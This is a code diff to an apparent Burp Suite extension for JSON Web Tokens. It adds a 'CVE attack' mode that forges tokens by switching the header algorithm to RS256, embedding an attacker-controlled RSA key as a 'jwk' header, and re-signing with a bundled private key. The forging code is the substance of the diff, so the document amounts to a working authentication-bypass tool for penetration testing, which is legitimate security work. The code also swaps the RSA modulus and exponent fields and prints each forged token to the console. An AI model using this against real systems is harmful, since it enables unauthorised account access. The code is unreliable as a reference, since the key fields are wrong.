@@ -4,12 +4,20 @@ import java.awt.Component;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.io.UnsupportedEncodingException;
+import java.security.KeyFactory;
+import java.security.interfaces.RSAPublicKey;
+import java.security.spec.X509EncodedKeySpec;
+import java.util.Base64;
 import java.util.List;
 
+import javax.swing.JCheckBox;
 import javax.swing.JComboBox;
 import javax.swing.SwingUtilities;
 
+
 import com.auth0.jwt.algorithms.Algorithm;
+import com.eclipsesource.json.Json;
+import com.eclipsesource.json.JsonObject;
 
 import app.algorithm.AlgorithmLinker;
 import app.controllers.ReadableTokenFormat.InvalidTokenFormat;
@@ -38,7 +46,9 @@ public class JWTInterceptTabController implements IMessageEditorTab {
 	private boolean keepOriginalSignature;
 	private boolean recalculateSignature;
 	private String algAttackMode;
+	private boolean cveAttackMode;
 
+	
 	public JWTInterceptTabController(IBurpExtenderCallbacks callbacks, JWTInterceptModel jwIM, JWTInterceptTab jwtST) {
 		this.jwtIM = jwIM;
 		this.jwtST = jwtST;
@@ -74,9 +84,21 @@ public class JWTInterceptTabController implements IMessageEditorTab {
 				algAttackChanged();
 			}
 		};
+		ActionListener cveAttackListener = new ActionListener() {
+			@Override
+			public void actionPerformed(ActionEvent e) {
+				cveAttackChanged();
+			}
+		};
 
-		jwtST.registerActionListeners(dontModifyListener, randomKeyListener, originalSignatureListener, recalculateSignatureListener,
-				algAttackListener);
+		jwtST.registerActionListeners(dontModifyListener, randomKeyListener, 
+				originalSignatureListener, recalculateSignatureListener,
+				algAttackListener,cveAttackListener);
+	}
+	
+	private void cveAttackChanged() {
+		JCheckBox a = jwtST.getCVEAttackCheckBox();
+		cveAttackMode = a.isSelected();
 	}
 
 	private void algAttackChanged() {
@@ -115,6 +137,19 @@ public class JWTInterceptTabController implements IMessageEditorTab {
 		if (randomKey && !oldRandomKey) {
 			generateRandomKey();
 		}
+	}
+	
+	private RSAPublicKey loadPublicKey(){
+	    String publicPEM = Strings.publicKey.replaceAll("\\n", "").replace("-----BEGIN PUBLIC KEY-----", "").replace("-----END PUBLIC KEY-----", "");;
+        KeyFactory kf;
+		try {
+			kf = KeyFactory.getInstance("RSA");
+			X509EncodedKeySpec keySpecX509 = new X509EncodedKeySpec(Base64.getDecoder().decode(publicPEM));
+			return (RSAPublicKey) kf.generatePublic(keySpecX509);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		return null;
 	}
 
 	private void generateRandomKey() {
@@ -196,6 +231,28 @@ public class JWTInterceptTabController implements IMessageEditorTab {
 			token.setHeaderJson(header.replace(token.getAlgorithm(), algAttackMode));
 			token.setSignature("");
 		}
+		if (cveAttackMode){
+			String a = token.getHeaderJson();
+			JsonObject value = Json.parse(a).asObject();
+			value.set("alg", "RS256");
+			JsonObject jwk = new JsonObject();
+			jwk.add("kty", "RSA");
+			jwk.add("kid", "jwt4b@portswigger.net");
+			jwk.add("use", "sig");
+			RSAPublicKey pk = loadPublicKey();
+			jwk.add("n", Base64.getUrlEncoder().encodeToString(pk.getPublicExponent().toByteArray()));
+			jwk.add("e", Base64.getUrlEncoder().encodeToString(pk.getModulus().toByteArray()));
+			value.add("jwk", jwk);
+			token.setHeaderJson(value.toString());
+			Algorithm algo;
+			try {
+				algo = AlgorithmLinker.getSignerAlgorithm(token.getAlgorithm(), Strings.privateKey);
+				token.calculateAndSetSignature(algo);
+			} catch (UnsupportedEncodingException e) {
+				e.printStackTrace();
+			}
+		}
+		System.out.println(token.getToken());
 		this.message = this.tokenPosition.replaceToken(token.getToken());
 		return this.message;
 
